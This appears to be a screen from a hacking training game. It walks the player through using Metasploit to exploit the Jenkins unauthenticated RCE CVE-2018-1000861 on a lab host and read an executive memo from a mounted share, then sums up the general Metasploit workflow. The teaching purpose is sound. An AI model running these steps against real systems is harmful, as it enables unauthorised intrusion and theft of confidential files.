PHASE 3 -- OPERATIONS
════════════════════
tool:  msfconsole

You found the bug in phase 2: CVE-2018-1000861, unauth RCE in
Jenkins 2.121.1. Now we walk through it.

The Ants' back-office Jenkins box has the executive fileshare
mounted at /mnt/exec/. The IC memo we want is at:

    /mnt/exec/ic-memo.txt


─── do this ──────────────────────────────────────────────────────

Type the following in the terminal, one line at a time:

    msfconsole
    set RHOSTS 10.4.12.1
    exploit
    cat /mnt/exec/ic-memo.txt

Module and callback are preloaded; you point and fire. After
`exploit`, the prompt goes blank -- you're on the Jenkins box,
typing as the jenkins user. `cat /mnt/exec/ic-memo.txt` is the
win. The narrative takes over from there; press Enter through the
screens, then `continue` at the m0usunet prompt to leave for TASK 3.


─── the full pattern, for next time ──────────────────────────────

Every metasploit walk, for any CVE you'll ever exploit with it:

    search        find the module by CVE id
    use           select it
    show options  see what params it needs
    set           fill in params (target, callback, etc.)
    check         confirm vulnerability before firing
    exploit       fire it; if it works, you get a shell

We did search/use/show/check for you. You did set + exploit. Same
muscles, fewer reps.

Stuck?  cat hint  -- no penalty.
